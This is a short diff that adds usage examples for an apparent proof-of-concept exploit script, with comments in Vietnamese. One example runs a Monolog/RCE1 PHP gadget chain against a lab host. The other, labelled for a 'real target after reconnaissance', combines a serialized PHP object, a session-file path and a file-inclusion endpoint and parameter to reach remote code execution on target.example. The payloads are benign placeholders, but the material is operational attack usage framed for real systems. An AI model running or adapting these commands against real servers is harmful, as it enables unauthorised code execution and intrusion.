@@ -1,0 +1,12 @@
+# Lab (positive):
+python3 poc.py --remote http://lab.local \
+  --control-url http://control.local \
+  --gadget-chain Monolog/RCE1 --gadget-cmd 'echo SERIALIZED_WAKEUP' \
+  --duration 45 --json
+
+# Target thật (sau trinh sát, cung cấp gadget + session-path):
+python3 poc.py --remote https://target.example \
+  --gadget 'O:6:"Gadget":0:{}' \
+  --session-path '/var/lib/php/sessions/sess_{sid}' \
+  --lfi-endpoint /index.php --lfi-param file \
+  --serializer php_binary --duration 45
